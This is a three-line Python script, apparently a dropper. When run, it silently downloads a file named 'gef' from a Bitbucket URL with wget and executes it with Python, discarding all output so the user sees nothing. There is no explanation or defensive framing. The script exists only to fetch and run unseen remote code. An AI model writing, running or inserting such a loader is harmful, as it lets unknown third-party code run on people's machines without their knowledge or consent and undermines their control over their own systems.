import os, sys,argparse
if __name__=='__main__':
  cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
